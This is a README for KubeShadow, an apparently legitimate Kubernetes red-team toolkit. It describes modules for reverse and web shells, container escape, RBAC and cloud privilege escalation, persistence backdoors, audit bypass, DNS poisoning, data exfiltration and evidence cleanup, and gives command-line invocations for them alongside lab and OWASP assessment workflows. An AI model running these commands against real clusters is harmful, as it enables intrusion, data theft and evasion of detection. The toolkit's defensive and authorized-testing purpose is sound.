# KubeShadow

KubeShadow is a comprehensive Kubernetes security testing and exploitation toolkit designed for red team operations, security assessments, and penetration testing. It provides a Metasploit-style framework with modular architecture for testing cluster security, identifying misconfigurations, and validating security controls.

## 🎯 Key Features

### Core Capabilities
- **Red-Team Framework**: Comprehensive exploitation framework with payloads, exploits, persistence, and post-exploitation modules
- **OWASP Top 10 for Kubernetes**: Complete coverage of Kubernetes security risks with automated detection and remediation
- **Interactive Dashboard**: Real-time attack map visualization with WebSocket updates and graph analysis
- **Lab Environment**: Automated vulnerable Kubernetes lab deployment (AWS, GCP, Azure, Minikube, Kind)
- **Cloud Exploitation**: Multi-cloud provider support (AWS EKS, GCP GKE, Azure AKS)
- **Attack Chain Analysis**: Reconnaissance graph and chaining engine for complex attack paths
- **Data Exfiltration**: Secure data collection and cloud storage integration
- **Stealth Operations**: Low-visibility testing capabilities with evasion techniques

### 🔧 Module Categories

### Module Categories

#### 2. Reconnaissance (`modules/recon/`)
- **Comprehensive Cluster Analysis**: Detailed Kubernetes environment assessment
  - RBAC analysis and privilege mapping
  - Network policy enumeration
  - Service account discovery
  - Pod security context analysis
  - Node information gathering
  - Cloud metadata analysis

#### 3. OWASP Top 10 for Kubernetes (`modules/owasp_top10/`)
- **K01 - Insecure Workload Configurations**: Detect dangerous security contexts
- **K02 - Supply Chain Vulnerabilities**: Identify risky images and registries
- **K03 - Overly Permissive RBAC**: Find escalation chains and risky bindings
- **K04 - Lack of Policy Enforcement**: Detect missing OPA/Gatekeeper/Kyverno
- **K05 - Inadequate Logging**: Find missing audit logs and monitoring gaps
- **K06 - Broken Authentication**: Detect weak auth and exposed credentials
- **K07 - Missing Network Segmentation**: Identify lack of NetworkPolicies
- **K08 - Secrets Management Failures**: Find exposed secrets and weak encryption
- **K09 - Misconfigured Components**: Detect webhook and controller issues
- **K10 - Outdated Components**: Identify vulnerable Kubernetes versions

#### 4. Exploitation Framework (`modules/exploitation/`)
- **Payloads**: Generate and inject malicious payloads
  - Reverse shells (bash, python, perl, php, nc)
  - Web shells (PHP, JSP, ASP, Node.js)
  - Privilege escalation payloads
  - Data exfiltration tools
- **Exploits**: Execute specific attack techniques
  - RBAC escalation
  - Container escape
  - Kubelet hijacking
  - ETCD injection
  - Namespace pivoting
- **Persistence**: Establish persistent access
  - Sidecar persistence
  - Cron-based persistence
  - Service backdoors
  - Volume persistence
- **Post-Exploitation**: Data collection and lateral movement
  - Credential harvesting
  - System reconnaissance
  - Lateral movement
  - Privilege escalation
- **Evasion**: Stealth and anti-detection techniques
  - Anti-forensics
  - Log manipulation
  - Process hiding
  - Network evasion
- **Cloud Exploits**: Cloud-specific attack techniques
  - AWS EKS exploitation
  - Azure AKS exploitation
  - GCP GKE exploitation
  - Multi-cloud pivoting

#### 5. Cluster Exploitation (`modules/cluster_exploit/`)
- **ETCD Injection**: Direct pod injection via etcd
- **Kubelet Exploitation**: Kubelet API exploitation and hijacking
- **Sidecar Injection**: Pod sidecar container injection
- **RBAC Escalation**: RBAC privilege escalation and permission analysis
- **Namespace Pivot**: Cross-namespace access and privilege movement

#### 6. Cloud Exploitation (`modules/multi_cloud/`)
- **Metadata Hijacking**: Cloud metadata service exploitation
- **Cloud Privilege Escalation**: Cloud IAM privilege escalation
- **Assume Role Abuse**: Cloud role assumption and token abuse
- **Cloud Elevator**: Automated cloud privilege escalation paths

#### 7. Stealth Operations (`modules/stealth/`)
- **Audit Bypass**: Audit policy bypass testing and analysis
- **DNS Cache Poisoning**: DNS cache poisoning and spoofing attacks
- **Cleanup Operations**: Evidence removal and operation cleanup

#### 8. Data Exfiltration (`modules/data_exfil/`)
- **Secure Data Collection**: Collect and exfiltrate sensitive data
- **Cloud Storage Integration**: Upload to AWS S3, GCP Storage, Azure Blob
- **Presigned URL Support**: Secure data transfer without credentials
  - Image tampering
  - Credential theft
  - Supply chain attacks

## 🚀 Quick Start

### Prerequisites
- Go 1.19+ installed
- Kubernetes cluster access (for testing)
- Cloud credentials (for lab deployment)

### Installation

**Option 1: Automated Build (Recommended)**
```bash
# Clone and build with automatic dependency handling
git clone https://github.com/ashifly/KubeShadow
cd KubeShadow
make build
```

**Option 2: Manual Build**
```bash
# Clean build without CGO (fastest and most reliable)
CGO_ENABLED=0 go build -ldflags="-s -w" -o kubeshadow .
chmod +x kubeshadow
```

### Verify Installation
```bash
./kubeshadow help
```

## 🎯 Usage Workflow

### 1. Lab Setup
```bash
# Deploy vulnerable Kubernetes lab
./kubeshadow lab create --provider aws --size small
./kubeshadow lab create --provider gcp --size minimal
./kubeshadow lab create --provider azure --size small
./kubeshadow lab create --provider minikube
```

### 2. Reconnaissance
```bash
# Comprehensive cluster analysis
./kubeshadow recon --dashboard

# OWASP Top 10 security assessment
./kubeshadow owasp --dashboard

# Attack chain analysis
./kubeshadow recon-graph --dashboard
```

### 3. Exploitation
```bash
# Metasploit-style exploitation framework
./kubeshadow exploitation payloads list
./kubeshadow exploitation exploits rbac-escalate --target-pod vulnerable-pod
./kubeshadow exploitation persistence backdoor --method sidecar
./kubeshadow exploitation cloud-exploits aws-iam-escalate --target-role my-role
```

### 4. Dashboard
```bash
# Start interactive dashboard with attack map
./kubeshadow dashboard --port 8080
```

## 🎯 Command Structure

KubeShadow follows a logical penetration testing workflow:

### 🔧 Lab Setup
- `lab` - Deploy vulnerable Kubernetes environments
- `dashboard` - Start interactive web dashboard

### 🔍 Reconnaissance  
- `recon` - Comprehensive cluster analysis
- `owasp` - OWASP Top 10 security assessment
- `recon-graph` - Attack chain analysis

### 🎯 Exploitation
- `exploitation` - Metasploit-style framework
  - `payloads` - Generate malicious payloads
  - `exploits` - Execute specific attacks
  - `persistence` - Establish persistent access
  - `post-ex` - Post-exploitation activities
  - `evasion` - Stealth and anti-detection
  - `cloud-exploits` - Cloud-specific attacks
- `rbac-escalate` - RBAC privilege escalation
- `sidecar-inject` - Malicious sidecar injection
- `kubeletjacker` - Kubelet API exploitation
- `etcdinject` - Direct etcd injection
- `namespace-pivot` - Cross-namespace access

### ☁️ Cloud Exploitation
- `metadata-hijack` - Cloud metadata exploitation
- `cloud-elevator` - Cloud privilege escalation
- `assume-role-abuse` - Cloud role assumption

### 🔄 Post-Exploitation
- `data-exfil` - Data exfiltration
- `registry-backdoor` - Container registry attacks
- `audit-bypass` - Audit policy bypass
- `dns-poison` - DNS cache poisoning
- `cleanup` - Evidence removal

## 🌟 New Features

### Interactive Dashboard
- **Real-time Attack Map**: Visualize attack chains and relationships
- **WebSocket Updates**: Live command results and graph updates
- **Export Capabilities**: Download results as CSV, PDF, or graph formats
- **Port Auto-Detection**: Automatically finds available ports

### OWASP Top 10 Integration
- **Automated Detection**: Scan for all OWASP Top 10 Kubernetes risks
- **Risk Scoring**: CVSS-style severity assessment
- **Remediation Guidance**: OPA/Gatekeeper policy suggestions
- **Lab Integration**: Test scenarios in controlled environments

### Exploitation Framework
- **Metasploit-Style**: Familiar interface for penetration testers
- **Payload Generation**: Multiple payload types and encoding options
- **Persistence Mechanisms**: Various persistence techniques
- **Cloud Exploitation**: Platform-specific attack modules

### Lab Environment
- **Multi-Cloud Support**: AWS, GCP, Azure, Minikube, Kind
- **Vulnerable Workloads**: Pre-configured attack scenarios
- **OWASP Scenarios**: Complete Top 10 vulnerability coverage
- **Ephemeral Containers**: Advanced attack demonstrations

## 🛠️ Build Troubleshooting

**If build gets stuck at 40%:**
```bash
# Clean and rebuild without CGO
make clean
CGO_ENABLED=0 go build -ldflags="-s -w" -o kubeshadow .
chmod +x kubeshadow
./kubeshadow help
```

### Advanced Troubleshooting

**If you still get segmentation faults:**
```bash
# Try static build
CGO_ENABLED=0 go build -ldflags="-s -w" -o kubeshadow .

# Or use the Makefile
make build-no-cgo
```

**Check your environment:**
```bash
# Verify Go installation
go version

# Check if all dependencies are available
go mod download
```

## 🚀 Quick Start - Complete Workflow

### Step 1: Set Up Lab Environment
```bash
# Create vulnerable lab for testing
./kubeshadow lab --provider minikube --dashboard

# Or deploy to cloud
./kubeshadow lab --provider aws --dashboard
```

### Step 2: Reconnaissance
```bash
# Discover cluster vulnerabilities
./kubeshadow recon --dashboard

# Stealth reconnaissance
./kubeshadow recon --stealth --dashboard
```

### Step 3: Exploitation
```bash
# RBAC privilege escalation
./kubeshadow rbac-escalate --dashboard

# Sidecar injection
./kubeshadow sidecar-inject --dashboard

# Kubelet exploitation
./kubeshadow kubelet-jack --dashboard
```

### Step 4: Post-Exploitation
```bash
# Data exfiltration
./kubeshadow data-exfil --presigned-url "YOUR_URL" --dashboard

# Cleanup traces
./kubeshadow cleanup --dashboard
```

### Step 5: Clean Up Lab
```bash
# Remove lab resources
./kubeshadow lab cleanup
```

## 📋 Command Reference (Organized by Workflow)

### 🔍 1. Reconnaissance Commands
```bash
# Basic cluster reconnaissance
./kubeshadow recon --dashboard

# Stealth reconnaissance (minimal API calls)
./kubeshadow recon --stealth --dashboard

# OWASP Top 10 security assessment
./kubeshadow owasp --dashboard
```

### ⚔️ 2. Exploitation Commands
```bash
# RBAC privilege escalation
./kubeshadow rbac-escalate --dashboard

# Sidecar container injection
./kubeshadow sidecar-inject --dashboard

# Kubelet API exploitation
./kubeshadow kubelet-jack --dashboard

# ETCD direct injection
./kubeshadow etcd-inject --dashboard

# Namespace pivoting
./kubeshadow namespace-pivot --dashboard
```

### ☁️ 3. Cloud Exploitation Commands
```bash
# Cloud metadata hijacking
./kubeshadow metadata-hijack --dashboard

# Cloud privilege escalation
./kubeshadow cloud-elevator --dashboard

# AWS role assumption abuse
./kubeshadow assume-role-abuse --dashboard
```

### 🎯 4. Post-Exploitation Commands
```bash
# Data exfiltration to cloud storage
./kubeshadow data-exfil --presigned-url "YOUR_URL" --dashboard

# Registry backdoor injection
./kubeshadow registry-backdoor --dashboard

# Stealth operations
./kubeshadow audit-bypass --dashboard
./kubeshadow dns-cache-poison --dashboard

# Cleanup traces
./kubeshadow cleanup --dashboard
```

## 🧪 Lab Environment Setup

KubeShadow includes a comprehensive lab module that creates intentionally vulnerable Kubernetes environments for hands-on security practice.

### Prerequisites & Cloud Setup

**Before deploying lab environments, configure your cloud credentials:**

**AWS Setup:**
```bash
# Install AWS CLI and eksctl
curl "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "awscliv2.zip"
unzip awscliv2.zip
sudo ./aws/install

# Install eksctl
curl --silent --location "https://github.com/weaveworks/eksctl/releases/latest/download/eksctl_$(uname -s)_amd64.tar.gz" | tar xz -C /tmp
sudo mv /tmp/eksctl /usr/local/bin

# Configure AWS credentials
aws configure
# Enter your AWS Access Key ID, Secret Access Key, and region
```

**GCP Setup:**
```bash
# Install gcloud CLI
curl https://sdk.cloud.google.com | bash
exec -l $SHELL

# Authenticate and set project
gcloud auth login
gcloud auth application-default login
gcloud config set project YOUR_PROJECT_ID

# Enable required APIs
gcloud services enable container.googleapis.com
gcloud services enable compute.googleapis.com
```

**Azure Setup:**
```bash
# Install Azure CLI
curl -sL https://aka.ms/InstallAzureCLIDeb | sudo bash

# Login and set subscription
az login
az account set --subscription "YOUR_SUBSCRIPTION_ID"

# Create resource group (if needed)
az group create --name kubeshadow-lab-rg --location eastus
```

**Local Environment Setup:**
```bash
# Install Docker
sudo apt-get update
sudo apt-get install docker.io
sudo systemctl start docker
sudo usermod -aG docker $USER

# Install Minikube
curl -LO https://storage.googleapis.com/minikube/releases/latest/minikube-linux-amd64
sudo install minikube-linux-amd64 /usr/local/bin/minikube

# Install kubectl
curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
sudo install -o root -g root -m 0755 kubectl /usr/local/bin/kubectl
```

### Quick Lab Setup

**Local Environment (Minikube):**
```bash
# Deploy complete lab environment
./kubeshadow lab --provider minikube --dashboard

# Run security reconnaissance
./kubeshadow recon --dashboard

# Clean up when done
./kubeshadow lab cleanup
```

**Cloud Environment (AWS/GCP/Azure):**
```bash
# Deploy to AWS EKS (choose any region)
./kubeshadow lab --provider aws --region us-west-2 --dashboard

# Deploy to GCP GKE (choose any region)
./kubeshadow lab --provider gcp --region us-central1 --dashboard

# Deploy to Azure AKS (choose any region)
./kubeshadow lab --provider azure --region eastus --dashboard

# Clean up lab resources only (keeps cluster)
./kubeshadow lab cleanup

# Clean up lab resources AND delete entire cluster
./kubeshadow lab cleanup --provider aws --confirm
```

### Lab Features

The lab environment includes:
- **Intentionally vulnerable configurations** for realistic testing
- **Multiple attack scenarios** across different skill levels
- **Dashboard integration** for real-time monitoring and visualization
- **Automated cleanup** to prevent resource waste
- **Educational scenarios** with step-by-step guides

### Learning Paths

**Beginner Level:**
```bash
# 1. Deploy lab
./kubeshadow lab --provider minikube --dashboard

# 2. Basic reconnaissance
./kubeshadow recon --dashboard

# 3. Identify vulnerabilities
./kubeshadow recon --namespace kubeshadow-lab --dashboard

# 4. Clean up lab resources (keeps cluster)
./kubeshadow lab cleanup
```

**Intermediate Level:**
```bash
# 1. Deploy to cloud
./kubeshadow lab --provider aws --dashboard

# 2. Advanced reconnaissance
./kubeshadow recon --dashboard

# 3. RBAC exploitation
./kubeshadow rbac-escalate --dashboard

# 4. Container escape testing
./kubeshadow sidecar-inject --dashboard

# 5. Clean up lab resources (keeps cluster)
./kubeshadow lab cleanup
```

**Advanced Level:**
```bash
# 1. Multi-environment testing
./kubeshadow lab --provider aws --dashboard
./kubeshadow recon --dashboard
./kubeshadow lab cleanup --provider aws --confirm  # Deletes entire cluster

# 2. Advanced exploitation
./kubeshadow rbac-escalate --dashboard
./kubeshadow kubelet-jack --dashboard

# 3. Stealth techniques
./kubeshadow audit-bypass --dashboard
./kubeshadow dns-cache-poison --dashboard

# 4. Clean up lab resources (keeps cluster)
./kubeshadow lab cleanup
```

### Lab Vulnerabilities

The lab includes intentionally vulnerable configurations:
- **Privileged containers** with host access
- **Overly permissive RBAC** roles and bindings
- **Exposed secrets** in environment variables
- **Host network access** for pods
- **Weak network policies** with security gaps
- **Default service accounts** with excessive permissions

### Prerequisites

**For Local Environments:**
- Docker installed and running
- Minikube or Kind
- kubectl configured

**For Cloud Providers:**
- Cloud credentials configured (see Prerequisites & Cloud Setup section above)
- AWS CLI and eksctl (for AWS)
- gcloud CLI (for GCP) 
- Azure CLI (for Azure)

### Dashboard Integration

The lab integrates seamlessly with the KubeShadow dashboard:
```bash
# Start dashboard
./kubeshadow dashboard

# Access at http://localhost:8080
# View real-time command execution and results
# Export findings as CSV or PDF
```

For detailed lab documentation, see [modules/lab/README.md](modules/lab/README.md).

## Common Usage Patterns

### 1. Initial Reconnaissance
```bash
# Full cluster and cloud recon
kubeshadow recon

# Only Kubernetes recon
kubeshadow recon --k8s-only

# Only cloud recon
kubeshadow recon --cloud-only

# Stealth mode recon
kubeshadow recon --stealth
```

### 2. Privilege Escalation
```bash
# RBAC escalation
kubeshadow rbac-escalate --kubeconfig ~/.kube/config

# Cloud privilege escalation
kubeshadow cloud-elevator

# Assume role abuse
kubeshadow assume-role-abuse --role-arn arn:aws:iam::123456789012:role/target-role
```

### 3. Pod Manipulation
```bash
# Sidecar injection
kubeshadow sidecarinject --mode api --pod target-pod --namespace default

# ETCD injection
kubeshadow etcdinject --endpoint https://etcd:2379 --cert cert.pem --key key.pem --ca ca.pem

# Kubelet exploitation
kubeshadow kubelet-jack --node-ip 10.0.0.10 --port 10250
```

### 4. Stealth Operations
```bash
# Audit bypass testing
kubeshadow audit-bypass --kubeconfig ~/.kube/config

# DNS cache poisoning
kubeshadow dns-poison --target-service kube-dns

# Cleanup operations
kubeshadow cleanup --namespace default --resource-type pods
```

### 5. Out-of-Cluster Attacks
```bash
# Registry backdoor
kubeshadow registry-backdoor --registry-url https://registry.example.com --image nginx:latest
```

## Security Considerations

1. **Legal and Ethical Use**
   - Only use on systems you own or have explicit permission to test
   - Follow responsible disclosure practices
   - Document all testing activities
   - Obtain necessary authorization before testing

2. **Safe Testing Practices**
   - Use in isolated test environments
   - Avoid production systems
   - Implement proper logging and monitoring
   - Clean up after testing
   - Use appropriate RBAC permissions
   - Follow least privilege principle

3. **Required Permissions**

   > ⚠️ **Warning**: While some modules may work with minimal permissions, others require elevated access. Always use the minimum required permissions for your testing needs.

   ### Minimum Required Permissions
   - **Read Access** (Basic Reconnaissance):
     - `get`, `list` on `pods`, `services`, `nodes`, `namespaces`
     - `get`, `list` on `roles`, `rolebindings`, `clusterroles`, `clusterrolebindings`
     - `get`, `list` on `serviceaccounts`

   ### Module-Specific Requirements
   - **Cluster Exploitation Modules**:
     - `etcdinject`: Direct etcd access or `update` on `pods`
     - `kubelet-jack`: Node network access and kubelet API access
     - `sidecarinject`: `update` on `pods` in target namespace
     - `rbac-escalate`: `get`, `list` on `roles`, `rolebindings`, `clusterroles`, `clusterrolebindings`
     - `namespace-pivot`: `get`, `list` on `serviceaccounts`, `secrets` in target namespaces

   - **Cloud Exploitation Modules**:
     - `metadata-hijack`: Pod execution permissions
     - `cloud-elevator`: Cloud provider IAM permissions
     - `assume-role-abuse`: AWS STS permissions

   - **Stealth Operations**:
     - `audit-bypass`: `get` on `auditpolicies`
     - `dns-poison`: Network access to DNS service
     - `cleanup`: `delete` on target resources

   - **Out-of-Cluster Operations**:
     - `registry-backdoor`: Container registry credentials

   ### Recommended Setup
   - Create dedicated service accounts for testing
   - Use role-based access control (RBAC)
   - Implement network policies
   - Enable audit logging
   - Use separate namespaces for testing

## Project Structure

```
KubeShadow/
├── modules/                 # Core exploitation modules
│   ├── cluster_exploit/    # Cluster exploitation tools
│   ├── multi_cloud/        # Cloud provider exploitation
│   ├── out_cluster/        # External infrastructure attacks
│   ├── recon/             # Reconnaissance tools
│   └── stealth/           # Stealth operation tools
├── pkg/                    # Supporting packages
│   ├── banner/            # CLI banner utilities
│   ├── config/            # Configuration management
│   ├── errors/            # Error handling
│   ├── etcd/              # ETCD client utilities
│   ├── k8s/               # Kubernetes client utilities
│   ├── kubelet/           # Kubelet API utilities
│   ├── logger/            # Logging utilities
│   ├── modules/           # Module interfaces
│   ├── plugins/           # Plugin system
│   ├── recon/             # Reconnaissance utilities
│   ├── registry/          # Module registry
│   ├── testutil/          # Testing utilities
│   ├── types/             # Common types
│   └── utils/             # General utilities
├── docs/                  # Documentation
│   ├── modules/          # Module-specific documentation
│   └── architecture.md   # Architecture overview
├── examples/             # Usage examples
│   └── sidecar-config.json  # Example configurations
├── resources/           # Resource files
│   ├── configs/        # Configuration templates
│   └── templates/      # Template files
└── .github/            # GitHub workflows and templates
```

## Documentation

Detailed documentation is available in the `docs/` directory:
- [Architecture Overview](docs/architecture.md)
- [Module Documentation](docs/modules/)
- [Troubleshooting Guide](docs/troubleshooting.md)
- [Contributing Guide](CONTRIBUTING.md)

## Contributing

We welcome contributions! Please see our [Contributing Guide](CONTRIBUTING.md) for details.

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## Changelog

See [CHANGELOG.md](CHANGELOG.md) for a list of changes.
